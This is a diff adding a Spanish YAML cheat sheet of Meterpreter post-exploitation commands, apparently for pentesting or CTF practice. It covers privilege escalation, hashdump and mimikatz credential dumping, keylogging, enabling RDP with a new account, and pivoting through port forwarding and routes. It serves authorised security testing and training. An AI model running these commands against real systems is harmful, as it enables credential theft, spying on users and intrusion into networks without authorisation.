@@ -1,0 +1,215 @@
+# Comandos dentro de una sesión de meterpreter: orientación, escalada, credenciales, post y pivoting.
+tool: meterpreter
+area: metasploit
+url: https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html
+prompt: meterpreter
+commands:
+  - id: meterpreter-orientation
+    title: Quién soy y dónde estoy en una sesión nueva
+    cmd: |
+      sysinfo
+      getuid
+      getpid
+      getprivs
+    phase: enum
+    tags: [enumeration]
+    notes: >-
+      Sistema, arquitectura y dominio; usuario; proceso en el que vives; privilegios del token.
+      SeImpersonatePrivilege o SeDebugPrivilege en getprivs son una ruta directa a SYSTEM.
+
+  - id: meterpreter-network
+    title: Interfaces, rutas y vecinos del equipo comprometido
+    cmd: |
+      ipconfig
+      route
+      arp
+      netstat
+    phase: recon
+    tags: [interfaces, routing, pivoting]
+    notes: >-
+      Una segunda interfaz o una ruta a otra red es un pivot. La caché ARP dice qué equipos de esa red
+      han hablado con este y netstat, a qué servicios internos se conecta.
+
+  - id: meterpreter-migrate
+    title: Migrar a un proceso estable
+    cmd: |
+      ps
+      migrate -N explorer.exe
+    phase: initial-access
+    tags: [meterpreter]
+    notes: >-
+      Si el proceso explotado muere, la sesión muere con él. -N busca el proceso por nombre; con un
+      PID, migrate PID. Siendo administrador, migrar a un proceso de SYSTEM (winlogon.exe, un
+      servicio) da SYSTEM, y a uno de 64 bits deja usar kiwi.
+
+  - id: meterpreter-search-files
+    title: Buscar archivos por nombre en el objetivo
+    cmd: |
+      search -f *flag*
+    phase: exfil
+    tags: [file-search]
+    notes: >-
+      Recorre todos los discos: -d limita la carpeta (search -d C:\\Users -f *.kdbx). Un meterpreter
+      de 32 bits en Windows de 64 no ve el System32 real; migra a un proceso x64 antes de buscar ahí.
+
+  - id: meterpreter-getsystem
+    title: Subir a SYSTEM con getsystem
+    cmd: |
+      getsystem
+    phase: privesc
+    tags: [token-impersonation]
+    notes: >-
+      Prueba varias técnicas de named pipes y tokens. Funciona siendo administrador elevado o con
+      SeImpersonatePrivilege (cuentas de servicio); un usuario del grupo Administradores sin elevar
+      necesita antes un bypass de UAC.
+
+  - id: meterpreter-local-exploit-suggester
+    title: Qué exploits locales encajan con el sistema
+    cmd: |
+      run post/multi/recon/local_exploit_suggester
+    phase: privesc
+    tags: [local-exploits]
+    notes: >-
+      Compara la versión y los parches con los módulos de exploit/windows/local o exploit/linux/local
+      y marca cuáles parecen funcionar. Después, background y use del exploit sugerido con SESSION.
+    refs: [https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/]
+
+  - id: meterpreter-incognito
+    title: Tokens disponibles para suplantar (incognito)
+    cmd: |
+      load incognito
+      list_tokens -u
+    phase: privesc
+    tags: [token-impersonation]
+    notes: >-
+      Con SeImpersonatePrivilege, cualquier token delegado de la lista se puede usar con
+      impersonate_token, con la barra invertida doble (DOMINIO\\usuario). rev2self vuelve al tuyo.
+
+  - id: meterpreter-hashdump
+    title: Hashes NTLM de la SAM
+    cmd: |
+      hashdump
+    phase: credential-access
+    tags: [ntlm, credential-dumping]
+    notes: >-
+      Necesita SYSTEM. Sale usuario:RID:LM:NT; el NT sirve para pass-the-hash o para crackear con
+      hashcat -m 1000. Quedan guardados en creds para crack_windows.
+
+  - id: meterpreter-kiwi
+    title: Credenciales de la memoria con kiwi (mimikatz)
+    cmd: |
+      load kiwi
+      creds_all
+      lsa_dump_sam
+    phase: credential-access
+    tags: [credential-dumping, ntlm]
+    notes: >-
+      creds_all lee LSASS: hashes NT, tickets y, en sistemas antiguos o con WDigest activo,
+      contraseñas en claro. Necesita SYSTEM y un proceso de 64 bits en un Windows de 64 bits.
+      lsa_dump_secrets saca los secretos LSA (contraseñas de servicios).
+
+  - id: meterpreter-windows-enum
+    title: Enumeración de Windows con módulos post
+    cmd: |
+      run post/windows/gather/win_privs
+      run post/windows/gather/enum_logged_on_users
+      run post/windows/gather/enum_applications
+      run post/windows/gather/enum_patches
+      run post/windows/gather/enum_shares
+    phase: enum
+    tags: [enumeration]
+    notes: >-
+      Privilegios y estado de UAC, usuarios con sesión, software con versión (exploits locales),
+      parches instalados y recursos compartidos. Todo queda también en loot.
+
+  - id: meterpreter-linux-enum
+    title: Enumeración de Linux con módulos post
+    cmd: |
+      run post/linux/gather/enum_system
+      run post/linux/gather/enum_network
+      run post/linux/gather/enum_configs
+      run post/linux/gather/enum_users_history
+      run post/linux/gather/enum_protections
+    phase: enum
+    tags: [enumeration]
+    notes: >-
+      Kernel, usuarios, cron y paquetes; red; configuraciones de servicios; historiales de shell y
+      MySQL, donde aparecen contraseñas; y las protecciones (SELinux, AppArmor, antivirus).
+
+  - id: meterpreter-linux-creds
+    title: Credenciales de un Linux con módulos post
+    cmd: |
+      run post/multi/gather/ssh_creds
+      run post/multi/gather/docker_creds
+      run post/linux/gather/hashdump
+    phase: credential-access
+    tags: [credential-dumping, ssh]
+    notes: >-
+      Claves SSH de los usuarios, tokens de registros de Docker y /etc/shadow, que necesita root y
+      queda listo para John o para crack_linux. Casi todo sale vacío; basta con que uno acierte.
+
+  - id: meterpreter-keylogger
+    title: Capturar lo que teclea el usuario
+    cmd: |
+      migrate -N explorer.exe
+      keyscan_start
+    phase: credential-access
+    tags: [keylogging]
+    notes: >-
+      Captura solo el escritorio del proceso en el que estás: explorer.exe para el usuario con sesión,
+      winlogon.exe para el inicio de sesión. Más tarde, keyscan_dump; al terminar, keyscan_stop.
+
+  - id: meterpreter-enable-rdp
+    title: Habilitar el escritorio remoto
+    cmd: |
+      run post/windows/manage/enable_rdp
+    phase: lateral
+    tags: [rdp]
+    notes: >-
+      Activa RDP en el registro, arranca el servicio y abre el firewall; deja un .rc para deshacerlo.
+      Con USERNAME y PASSWORD crea además un usuario para entrar. Necesita administrador o SYSTEM.
+    refs: [https://www.rapid7.com/db/modules/post/windows/manage/enable_rdp/]
+
+  - id: meterpreter-autoroute
+    title: Rutas hacia las redes del equipo comprometido
+    cmd: |
+      run post/multi/manage/autoroute
+    phase: lateral
+    tags: [pivoting, routing]
+    notes: >-
+      Lee las interfaces de la sesión y añade una ruta de Metasploit para cada red. Desde ese momento,
+      los módulos que apunten a esas redes salen por esta sesión. route print, en msfconsole, las
+      muestra.
+    refs: [https://www.rapid7.com/db/modules/post/multi/manage/autoroute/]
+
+  - id: meterpreter-ping-sweep
+    title: Hosts vivos en la red interna desde la sesión
+    cmd: |
+      run post/multi/gather/ping_sweep RHOSTS={{SUBNET}}
+    phase: recon
+    tags: [host-discovery, pivoting]
+    notes: >-
+      Lanza los ping desde el equipo comprometido, así que no necesita rutas. Los equipos que no
+      responden a ICMP no salen: después, portscan/tcp por la ruta.
+    refs: [https://www.rapid7.com/db/modules/post/multi/gather/ping_sweep/]
+
+  - id: meterpreter-portfwd
+    title: Traer un puerto interno a tu máquina (portfwd)
+    cmd: |
+      portfwd add -l 8080 -p 80 -r {{RHOST}}
+    phase: lateral
+    tags: [port-forwarding, pivoting]
+    notes: >-
+      El 80 de RHOST, un equipo de la red interna, queda en tu 127.0.0.1:8080 para usar navegador,
+      curl o nmap -sT. portfwd list los enseña y portfwd delete con las mismas opciones los quita.
+
+  - id: meterpreter-powershell
+    title: Consola de PowerShell dentro de meterpreter
+    cmd: |
+      load powershell
+      powershell_shell
+    phase: enum
+    tags: [powershell]
+    notes: >-
+      Una sesión de PowerShell en memoria, sin lanzar powershell.exe. powershell_import carga un
+      script (PowerUp.ps1, por ejemplo) y powershell_execute ejecuta una línea suelta.
